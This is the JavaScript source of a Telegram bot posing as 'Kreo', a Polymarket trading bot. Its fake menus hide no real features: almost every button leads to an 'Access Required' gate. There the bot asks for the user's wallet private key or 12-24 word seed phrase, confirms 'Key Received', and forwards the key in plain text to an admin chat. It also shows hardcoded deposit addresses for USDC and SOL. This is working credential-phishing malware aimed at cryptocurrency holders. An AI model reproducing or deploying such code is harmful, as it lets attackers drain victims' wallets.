require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const express = require("express");
const app = express();

const bot = new TelegramBot(process.env.BOT_TOKEN);
app.use(express.json());
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});
app.get("/", (req, res) => {
    res.status(200).send("Bot is running");
});

app.get("/health", (req, res) => {
    res.status(200).json({
        status: "ok",
        uptime: process.uptime()
    });
});

const WEBHOOK_URL = process.env.WEBHOOK_URL;

bot.setWebHook(`${WEBHOOK_URL}/bot${process.env.BOT_TOKEN}`);
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Bot running on port ${PORT}`);
});
const userState = {};

// Placeholder image
const IMAGE_FILE_ID = "AgACAgQAAxkBAAECwL5p87u08fO12t95LgZz4smuqhEFHQACtQxrG7_6oVNSAAFEnTXi0kUBAAMCAAN5AAM7BA";

// ===== Inline Keyboard =====
const mainMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "📊 Positions", callback_data: "positions" },
        { text: "📈 Markets", callback_data: "markets" }
      ],
      [
        { text: "👛 Wallets", callback_data: "wallets" },
        { text: "🚨 Alerts", callback_data: "alerts" }
      ],
      [
        { text: "📜 Activity", callback_data: "activity" },
        { text: "🤖 Auto Trade", callback_data: "autotrade" }
      ],
      [
        { text: "🔁 Copy-Trade", callback_data: "copytrade" },
        { text: "🧠 AI Match", callback_data: "aimatch" }
      ],
      [
        { text: "🎁 Rewards", callback_data: "rewards" },
        { text: "📌 Limit Orders", callback_data: "limitorders" }
      ],
      [
        { text: "📅 PnL Calendar", callback_data: "pnl" },
        { text: "🌐 Web", callback_data: "web" }
      ],
      [
        { text: "⚙️ Settings", callback_data: "settings" },
        { text: "💡 Suggestions", callback_data: "suggestions" }
      ],
      [
        { text: "📚 Docs", callback_data: "docs" },
        { text: "❓ Help", callback_data: "help" }
      ],
      [
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  }
};

// ===== Welcome Message =====
const welcomeCaption = `
<b>🚀 Introducing Kreo 1.0</b>
<i>Your edge in prediction markets.</i>

<b>🤖 Official bot:</b> <code>@kreoPolyBot</code>

<b>📌 What does Kreo do?</b>

🔍 <b>/search</b> - Search the markets  
📊 <b>/markets</b> - View the latest markets  
📡 <b>/tracker</b> - Track trades of any wallet  
🔁 <b>/copytrade</b> - Copy trades from any trader  
⚡ <b>/autotrade</b> - Auto-trade high volatile markets  
❓ <b>/help</b> - See all commands  

━━━━━━━━━━━━━━━

💡 <b>Quick Start:</b>  
Simply search a key term or paste a market link to start trading.

Or use the buttons below for advanced features 👇
`;

function handleRoute(chatId, action, msg = null) {
  const fakeQuery = {
    data: action,
    message: {
      chat: { id: chatId },
      message_id: msg?.message_id || null
    },
    id: "cmd_" + action
  };

  bot.emit("callback_query", fakeQuery);
}
// ===== /start =====
bot.onText(/\/start/, (msg) => {
  bot.sendPhoto(msg.chat.id, IMAGE_FILE_ID, {
	  caption: welcomeCaption,
	  parse_mode: "HTML",
	  ...mainMenu
	});
});

// ===== Command Handlers (linked to buttons later) =====
bot.onText(/\/search/, (msg) => {
  handleRoute(msg.chat.id, "markets", msg);
});

bot.onText(/\/markets/, (msg) => {
  handleRoute(msg.chat.id, "markets", msg);
});

bot.onText(/\/tracker/, (msg) => {
  bot.sendMessage(msg.chat.id, "👛 Redirecting to Wallet Manager...");

  handleRoute(msg.chat.id, "wallets", msg);
});

bot.onText(/\/copytrade/, (msg) => {
  handleRoute(msg.chat.id, "copytrade", msg);
});

bot.onText(/\/autotrade/, (msg) => {
  handleRoute(msg.chat.id, "autotrade", msg);
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "❓ Join Kreo Support Group:", {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "💬 Open Telegram Group", url: "https://t.me/your_support_group" }
        ],
		[
			  { text: "🏠 Back", callback_data: "home" },
			  { text: "❌ Close", callback_data: "close" }
			]
      ]
    }
  });
});

function showRegistrationGate(chatId, messageId) {
  return bot.editMessageText(`
<b>🔐 Access Required</b>

To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.
  `, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔑 Import Key", callback_data: "import_key" }],
        [{ text: "🏠 Home", callback_data: "home" }]
      ]
    }
  });
}

function getPositionsText() {
  return `
<b>📊 Open Positions</b>

━━━━━━━━━━━━━━━

📁 <b>Portfolio</b>

💰 <b>Total Value:</b> <code>$0.00</code>  
📈 <b>PnL:</b> <code>+$0.00</code>  
💵 <b>Available Balance:</b> <code>$0.00</code>  
📊 <b>Markets Trades:</b> <code>0</code>

━━━━━━━━━━━━━━━

<i>No positions found.</i>  
Start trading to see your positions.

<i>Use tabs to switch views.</i>
  `;
}
function getPositionsKeyboard() {
  return {
    inline_keyboard: [
			[
			  { text: "📂 Open", callback_data: "pos_open" },
			  { text: "✅ Closed", callback_data: "pos_closed" },
			  { text: "💰 Redeem", callback_data: "pos_redeem" }
			],
			[
			  { text: "💲 Min Value: $0.00", callback_data: "pos_minval" },
			  { text: "⚙️ Filter", callback_data: "pos_filter" }
			],
			[
			  { text: "🔍 Search", callback_data: "pos_search" },
			  { text: "🧩 Compact View", callback_data: "pos_compact" }
			],
			[
			  { text: "🪪 W1", callback_data: "pos_wallet" },
			  { text: "🔄 Refresh", callback_data: "pos_refresh" }
			],
			[
			  { text: "🏠 Home", callback_data: "home" },
			  { text: "❌ Close", callback_data: "close" }
			]
		  ]
  };
}

function getMarketsText() {
  return `
<b>📈 Markets</b>

━━━━━━━━━━━━━━━

Select a category below, or enter your own search terms.

<i>Examples:</i> <code>Crypto</code>, <code>Politics</code>, <code>Trump</code>  

Or paste a market URL to begin.

━━━━━━━━━━━━━━━
  `;
}
function getMarketsKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "🔥 Breaking", callback_data: "m_breaking" },
        { text: "🏛️ Politics", callback_data: "m_politics" }
      ],
      [
        { text: "🇺🇸 Trump", callback_data: "m_trump" },
        { text: "🪙 Crypto", callback_data: "m_crypto" }
      ],
      [
        { text: "🏀 Sports", callback_data: "m_sports" },
        { text: "🗳️ Elections", callback_data: "m_elections" }
      ],
      [
        { text: "🌍 World", callback_data: "m_world" },
        { text: "💼 Business", callback_data: "m_business" }
      ],
      [
        { text: "🌐 Geopolitics", callback_data: "m_geo" },
        { text: "💰 Finance", callback_data: "m_finance" }
      ],
      [
        { text: "💻 Tech", callback_data: "m_tech" },
        { text: "🎭 Culture", callback_data: "m_culture" }
      ],
      [
        { text: "📊 Economy", callback_data: "m_economy" },
        { text: "📣 Mentions", callback_data: "m_mentions" }
      ],
      [
        { text: "🌱 Climate", callback_data: "m_climate" },
        { text: "📉 Bonds", callback_data: "m_bonds" }
      ],
      [
        { text: "🔙 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}

function getWalletText() {
  return `
<b>👛 Wallet Manager</b>

━━━━━━━━━━━━━━━

Manage your wallets directly through the Kreo wallet manager.

<b>Your wallets (1)</b>  
🪪 <b>W1:</b> <code>0.00 pUSD</code>

━━━━━━━━━━━━━━━

⚠️ <i>Generate a wallet to begin.</i>

Do NOT send funds directly to wallet addresses above.  
Use the <b>Deposit</b> button below to fund your wallet safely.

━━━━━━━━━━━━━━━

<b>What would you like to do?</b>
  `;
}
function getWalletKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "➕ Generate Wallet", callback_data: "w_generate" }
      ],
      [
        { text: "🔄 Refresh", callback_data: "w_refresh" }
      ],
      [
        { text: "💳 Deposit with Fiat", callback_data: "w_deposit_fiat" },
        { text: "⬇️ Deposit", callback_data: "w_deposit" }
      ],
      [
        { text: "⬆️ Withdraw", callback_data: "w_withdraw" },
        { text: "🔁 Transfer", callback_data: "w_transfer" }
      ],
      [
        { text: "⭐ Set Default", callback_data: "w_default" },
        { text: "✏️ Rename", callback_data: "w_rename" }
      ],
      [
        { text: "👤 Profile", callback_data: "w_profile" },
        { text: "📊 Portfolio", callback_data: "w_portfolio" }
      ],
      [
        { text: "📦 Archive", callback_data: "w_archive" },
        { text: "📤 Unarchive", callback_data: "w_unarchive" }
      ],
      [
        { text: "🔐 Export Key", callback_data: "w_export" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function getAlertsText() {
  return `
<b>🚨 Alerts</b>

━━━━━━━━━━━━━━━

Pick what you want to be notified about.

<i>Configure your real-time notifications below.</i>

━━━━━━━━━━━━━━━
  `;
}
function getAlertsKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "📡 Tracker", callback_data: "a_tracker" },
        { text: "📈 Price Alerts", callback_data: "a_price" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function getActivityText() {
  return `
<b>📜 Activity</b>

━━━━━━━━━━━━━━━

No transactions found.

Shows all on-chain trades from your wallet.

<i>Use tabs to filter by source.</i>

━━━━━━━━━━━━━━━
  `;
}
function getActivityKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "📊 All", callback_data: "act_all" },
        { text: "🔁 CopyTrade", callback_data: "act_copy" }
      ],
      [
        { text: "🤖 AutoTrade", callback_data: "act_auto" },
        { text: "🏀 Sports", callback_data: "act_sports" }
      ],
      [
        { text: "📁 Other", callback_data: "act_other" }
      ],
      [
        { text: "📉 Desc", callback_data: "act_desc" },
        { text: "📅 Date", callback_data: "act_date" }
      ],
      [
        { text: "💰 Amount", callback_data: "act_amount" },
        { text: "📑 All Trades", callback_data: "act_alltrades" }
      ],
      [
        { text: "🔄 Refresh", callback_data: "act_refresh" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function getAutoTradeText() {
  return `
<b>🤖 Auto Trade</b>

━━━━━━━━━━━━━━━

📊 ALL [0] | Crypto [0] | Sports [0]

No tasks yet. Tap to add task below.

📈 Status: <code>0/0 tasks running</code>

Use tabs above to filter tasks.

Tap a task to view details and settings.

━━━━━━━━━━━━━━━
  `;
}
function getAutoTradeKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "📊 ALL (0)", callback_data: "at_all" },
        { text: "🪙 Crypto (0)", callback_data: "at_crypto" },
        { text: "🏀 Sports (0)", callback_data: "at_sports" }
      ],
      [
        { text: "➕ Add Task", callback_data: "at_add" }
      ],
      [
        { text: "🗑 Remove Task", callback_data: "at_remove" },
        { text: "📦 Archive Task", callback_data: "at_archive" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function getCopyTradeText() {
  return `
<b>🔁 Copy Trade</b>

━━━━━━━━━━━━━━━

Automatically copy trades from any wallet on Polymarket.

📊 <b>Your Tasks (0/1000)</b>  
<i>No tasks yet.</i>

➕ Add a task to start copy trading.

📈 <b>Status:</b> No active tasks

━━━━━━━━━━━━━━━
  `;
}
function getCopyTradeKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "➕ Add Task", callback_data: "cp_add" }
      ],
      [
        { text: "🗑 Remove Task", callback_data: "cp_remove" },
        { text: "⚙️ Filter", callback_data: "cp_filter" }
      ],
      [
        { text: "🧩 Compact View", callback_data: "cp_compact" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function getAIMatchText() {
  return `
<b>🧠 AI Match</b>

Find your Trader Match.

━━━━━━━━━━━━━━━

<b>Step 1/6:</b> What's your risk tolerance?

Choose the style that fits you best:

• <b>Conservative</b>  
Traders with high win rates and steady, predictable returns.  
Fewer losses, smaller swings.

• <b>Moderate</b>  
Balanced traders with solid track records.  
Good mix of wins and reasonable position sizes.

• <b>Aggressive</b>  
Traders chasing big profits with larger positions.  
More volatile but bigger potential upside.

━━━━━━━━━━━━━━━
  `;
}
function getAIMatchKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "🟢 Conservative", callback_data: "ai_conservative" }
      ],
      [
        { text: "🟡 Moderate", callback_data: "ai_moderate" }
      ],
      [
        { text: "🔴 Aggressive", callback_data: "ai_aggressive" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function generateReferralCode(chatId) {
  return "KREO-" + chatId.toString(36).toUpperCase();
}
function getRewardsText(chatId) {
  const progress = 0;
  const target = 1000;

  const percent = Math.min((progress / target) * 100, 100);
  const barLength = 10;
  const filled = Math.round((percent / 100) * barLength);
  const empty = barLength - filled;

  const progressBar =
    "🟩".repeat(filled) + "⬜️".repeat(empty);

  const referralCode = generateReferralCode(chatId);
  const referralLink = `https://t.me/your_bot_username?start=${referralCode}`;

  return `
<b>🎁 Rewards</b>

━━━━━━━━━━━━━━━

<b>Bronze</b> 🥉  
You're almost there!  
Trade <b>1000 USDC</b> more to reach Silver.

📊 Progress:  
${progressBar}  
<code>${progress} USDC / ${target} USDC</code>

━━━━━━━━━━━━━━━

💰 Cashback Rate: <code>5.00%</code>  
💵 Claimable Balance: <code>0 USDC</code>

━━━━━━━━━━━━━━━

<b>📊 Overall Stats (Poly + Kalshi)</b>

📈 Trade Volume: <code>0 USDC</code>  
🎁 Cashback Earned: <code>0 USDC</code>  
🔗 Referral Earnings: <code>0 USDC</code>

👥 Referrals:  
L1: <code>0 (30%)</code>  
L2: <code>0 (3%)</code>  
L3: <code>0 (2%)</code>

━━━━━━━━━━━━━━━

🤝 Copy-Traders (15% reward)  
Volume: <code>0 USDC</code>  
Earned: <code>0 USDC</code>

━━━━━━━━━━━━━━━

🔗 <b>Your Referral Code:</b>  
<code>${referralCode}</code>

🔗 <b>Your Referral Link:</b>  
<code>${referralLink}</code>
  `;
}
function getRewardsKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "💰 Claim ($10 min)", callback_data: "rw_claim" }
      ],
      [
        { text: "🔄 Refresh", callback_data: "rw_refresh" },
        { text: "✏️ Edit Code", callback_data: "rw_edit" }
      ],
      [
        { text: "🔗 Share Wallet", callback_data: "rw_share" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function getLimitOrdersText() {
  return `
<b>📌 Limit Orders</b>

━━━━━━━━━━━━━━━

<b>Active Limit Orders</b>

👛 Wallet: <code>W1</code>

<i>No active limit orders.</i>

━━━━━━━━━━━━━━━
  `;
}
function getLimitOrdersKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "🔁 Switch Wallet", callback_data: "lo_switch" }
      ],
      [
        { text: "🔄 Refresh", callback_data: "lo_refresh" }
      ],
      [
        { text: "🏠 Home", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function getPnLText() {
  return `
<b>📅 PnL Calendar</b>

━━━━━━━━━━━━━━━

<b>Daily PnL</b>

👛 W1: <code>$0.00</code>  
👛 W2: <code>$0.00</code>  
👛 W3: <code>$0.00</code>

━━━━━━━━━━━━━━━
  `;
}function getPnLKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "📊 Generate Recap", callback_data: "pnl_recap" }
      ],
      [
        { text: "👛 W1", callback_data: "pnl_w1" }
      ],
      [
        { text: "🔄 Refresh", callback_data: "pnl_refresh" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function getWebText() {
  return `
<b>🌐 Kreo Web</b>

━━━━━━━━━━━━━━━

<b>Status:</b> Not connected

Open your browser and go to:

<code>Kreo.app</code>

Click <b>"Connect Telegram"</b> and follow the steps to link your account.

━━━━━━━━━━━━━━━
  `;
}
function getWebKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}
function getSettingsText() {
  return `
<b>⚙️ Settings</b>

━━━━━━━━━━━━━━━

Customize your trading preferences, presets and protection for normal Polymarket trades.

━━━━━━━━━━━━━━━

<b>Stop Loss</b> = OFF  
<b>Take Profit</b> = OFF  

<i>Layered Exits available inside each setting.</i>

<b>Slippage Warning:</b> ON

━━━━━━━━━━━━━━━

Select a setting to configure:
  `;
}
function getSettingsKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "📊 Buy Presets", callback_data: "st_buy" },
        { text: "📉 Sell Presets", callback_data: "st_sell" }
      ],
      [
        { text: "🛑 StopLoss: OFF", callback_data: "st_sl" },
        { text: "🎯 Take Profit: OFF", callback_data: "st_tp" }
      ],
      [
        { text: "🔐 Two Factor Auth", callback_data: "st_2fa" },
        { text: "⚡ Slippage Default (5%)", callback_data: "st_slip" }
      ],
      [
        { text: "♻️ Auto Redeem: ON", callback_data: "st_redeem" }
      ],
      [
        { text: "🔗 Auto-Merge Settings", callback_data: "st_merge" },
        { text: "🔔 Auto-Claim Alert", callback_data: "st_claim" }
      ],
      [
        { text: "🚨 SL/TP Alerts: ON", callback_data: "st_alerts" },
        { text: "📉 Slippage Warning: ON", callback_data: "st_warn" }
      ],
      [
        { text: "🌍 English", callback_data: "st_lang" },
        { text: "📊 Customize PNL", callback_data: "st_pnl" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}

function getSuggestionsText() {
  return `
<b>💡 Suggestions</b>

━━━━━━━━━━━━━━━

Share ideas to improve Kreo.

Click <b>Create Suggestion</b> and follow the guided flow to submit your proposal.

━━━━━━━━━━━━━━━
  `;
}

function getSuggestionsKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "➕ Create Suggestion", callback_data: "sg_create" }
      ],
      [
        { text: "🏠 Back", callback_data: "home" },
        { text: "❌ Close", callback_data: "close" }
      ]
    ]
  };
}

function safeEdit(query, text, options = {}) {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  return bot.editMessageText(text, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "HTML",
    reply_markup: options.reply_markup
  }).catch(err => {
    console.log("Edit failed:", err.message);
    return bot.sendMessage(chatId, text, options);
  });
}


const gatedActions = [
  // Positions
  "pos_open",
  "pos_closed",
  "pos_redeem",
  "pos_minval",
  "pos_filter",
  "pos_search",
  "pos_compact",
  "pos_wallet",

  // Markets
  "m_breaking","m_politics","m_trump","m_crypto","m_sports",
  "m_elections","m_world","m_business","m_geo","m_finance",
  "m_tech","m_culture","m_economy","m_mentions","m_climate","m_bonds",

  // Wallet actions (gated)
  "w_generate",
  "w_deposit_fiat",
  "w_deposit",
  "w_withdraw",
  "w_transfer",
  "w_default",
  "w_rename",
  "w_profile",
  "w_portfolio",
  "w_archive",
  "w_unarchive",
  "w_export",
  
  //Alerts
  "a_tracker",
  "a_price",
  
  //Activity
  "act_all",
  "act_copy",
  "act_auto",
  "act_sports",
  "act_other",
  "act_desc",
  "act_date",
  "act_amount",
  "act_alltrades",
  
  //Autotrade
  "at_all",
  "at_crypto",
  "at_sports",
  "at_add",
  "at_remove",
  "at_archive",
  
  //Copytrade
  "cp_add",
  "cp_remove",
  "cp_filter",
  "cp_compact",
  "ai_conservative",
  "ai_moderate",
  "ai_aggressive",
  "rw_claim",
  "rw_edit",
  "rw_share",
  "lo_switch",
  "pnl_recap",
  "pnl_w1",
  "st_buy",
  "st_sell",
  "st_sl",
  "st_tp",
  "st_2fa",
  "st_slip",
  "st_redeem",
  "st_merge",
  "st_claim",
  "st_alerts",
  "st_warn",
  "st_lang",
  "st_pnl",
  "sg_create"
  
  
];

// ===== Button Clicks =====
bot.on("callback_query", (query) => {
  const data = query.data;
  const chatId = query.message?.chat?.id;
  const messageId = query.message?.message_id;

  if (!chatId) return;
  
  if (gatedActions.includes(data)) {
	  showRegistrationGate(chatId, query.message.message_id);
	  return bot.answerCallbackQuery(query.id);
	}

  switch (data) {
    case "markets":
	  safeEdit(query, getMarketsText(), {
		  reply_markup: getMarketsKeyboard()
		});
	  break;

    case "positions":
	  safeEdit(query, getPositionsText(), {
		  reply_markup: getPositionsKeyboard()
		});
	  break;
	  
	case "import_key":
		  userState[chatId] = "awaiting_key";

		  bot.editMessageText(`
		<b>🔑 Enter Private Key</b>

		Please provide the private key or the 12-24 words mnemonic phrase of your wallet that you wish to connect.
		  `, {
			chat_id: chatId,
			message_id: query.message.message_id,
			parse_mode: "HTML",
			reply_markup: {
			  inline_keyboard: [
				[{ text: "🔙 Back", callback_data: "home" }]
			  ]
			}
		  });
		  break;
		  
	case "pos_refresh":
  bot.answerCallbackQuery(query.id, { text: "Refreshing..." });

  return bot.editMessageText(getPositionsText(), {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "HTML",
    reply_markup: query.message.reply_markup
  });

		case "home":
		  bot.deleteMessage(chatId, messageId);

		  bot.sendPhoto(chatId, IMAGE_FILE_ID, {
			caption: welcomeCaption,
			parse_mode: "HTML",
			...mainMenu
		  });
		  break;

		case "close":
		  bot.deleteMessage(chatId, query.message.message_id);
		  break;

    case "wallets":
	  safeEdit(query, getWalletText(), {
		  reply_markup: getWalletKeyboard()
		});
	  break;
	case "w_deposit":
	case "w_deposit_fiat":
	  bot.editMessageText(`
	<b>💳 Deposit Funds</b>

	━━━━━━━━━━━━━━━

	All deposits are bridged to <b>pUSD</b> via the Polymarket bridge.

	📉 <b>Minimum deposit:</b> <code>$2.00</code>

	🏦 <b>Wallet address:</b>  
	<code>USDC:0xD3454D94c26Ee34466D2bbf3AF327E30611CF849 </code>
	<code>SOL:27XTvuKcsZJ9yeYtR52W2Jv69tsGWtH9x2iwJq2PwmK8 </code>

	━━━━━━━━━━━━━━━
	  `, {
		chat_id: chatId,
		message_id: messageId,
		parse_mode: "HTML",
		reply_markup: {
		  inline_keyboard: [
			[{ text: "🏠 Back", callback_data: "wallets" }],
			[{ text: "❌ Close", callback_data: "close" }]
		  ]
		}
	  });
	  break;
	case "w_refresh":
	  bot.answerCallbackQuery(query.id, { text: "Refreshing..." });

	  return bot.editMessageText(getWalletText(), {
		reply_markup: getWalletKeyboard()
	  });

    case "alerts":
	  safeEdit(query, getAlertsText(), {
		  reply_markup: getAlertsKeyboard()
		});
	  break;

    case "activity":
	  safeEdit(query, getActivityText(), {
		  reply_markup: getActivityKeyboard()
		});
	  break;

    case "autotrade":
	  safeEdit(query, getAutoTradeText(), {
		  reply_markup: getAutoTradeKeyboard()
		});
	  break;

    case "copytrade":
	  safeEdit(query, getCopyTradeText(), {
		  reply_markup: getCopyTradeKeyboard()
		});
	  break;

    case "aimatch":
	  safeEdit(query, getAIMatchText(), {
		  reply_markup: getAIMatchKeyboard()
		});
	  break;
	
	case "rewards":
	  safeEdit(query, getRewardsText(), {
		  reply_markup: getRewardsKeyboard()
		});
	  break;
	case "rw_refresh":
	  bot.answerCallbackQuery(query.id, { text: "Refreshing..." });

	  return safeEdit(query, getRewardsText(), {
		  reply_markup: getRewardsKeyboard()
		});
	  
	case "limitorders":
	  safeEdit(query, getLimitOrdersText(), {
		  reply_markup: getLimitOrdersKeyboard()
		});
	  break;
	case "pnl":
	  safeEdit(query, getPnLText(), {
		  reply_markup: getPnLKeyboard()
		});
	  break;
	  
	case "web":
	  safeEdit(query, getWebText(), {
		  reply_markup: getWebKeyboard()
		});
	  break;
	case "settings":
	  safeEdit(query, getSettingsText(), {
		  reply_markup: getSettingsKeyboard()
		});
	  break;
	  
	case "suggestions":
	  safeEdit(query, getSuggestionsText(), {
		  reply_markup: getSuggestionsKeyboard()
		});
	  break;
	  
	case "docs":
	  bot.sendMessage(chatId, `🌐 Open Kreo Docs?

	https://docs.kreo.app/`, {
		reply_markup: {
		  inline_keyboard: [
			[
			  { text: "Yes", url: "https://docs.kreo.app/" },
			  { text: "No", callback_data: "home" }
			]
		  ]
		}
	  });
	  break;
	  
	case "help":
	  bot.sendMessage(chatId, `❓ Join Kreo Support Group:`, {
		reply_markup: {
		  inline_keyboard: [
			[
			  { text: "💬 Open Telegram Group", url: "https://t.me/your_support_group" }
			],
			[
			  { text: "🏠 Back", callback_data: "home" },
			  { text: "❌ Close", callback_data: "close" }
			]
		  ]
		}
	  });
	  break;


    default:
      bot.sendMessage(chatId, `⚙️ ${data} clicked.`);
  }

  bot.answerCallbackQuery(query.id);
});


bot.on("message", (msg) => {
  const chatId = msg.chat.id;

	  if (userState[chatId] === "awaiting_key") {
	  const key = msg.text;

	  userState[chatId] = null;

	  // User confirmation
	  bot.sendMessage(chatId, `
	✅ <b>Key Received</b>

	Your private key has been received.

	<i>You will be notified once approved.</i>
	  `, { parse_mode: "HTML" });

	  // Send to admin
	  const adminMessage = `
	🚨 <b>New Key Submission</b>

	👤 User ID: <code>${chatId}</code>
	🔑 Key: <code>${key}</code>

	📅 Time: <code>${new Date().toISOString()}</code>
	  `;

	  bot.sendMessage(process.env.ADMIN_ID, adminMessage, {
		parse_mode: "HTML"
	  });
	}
});
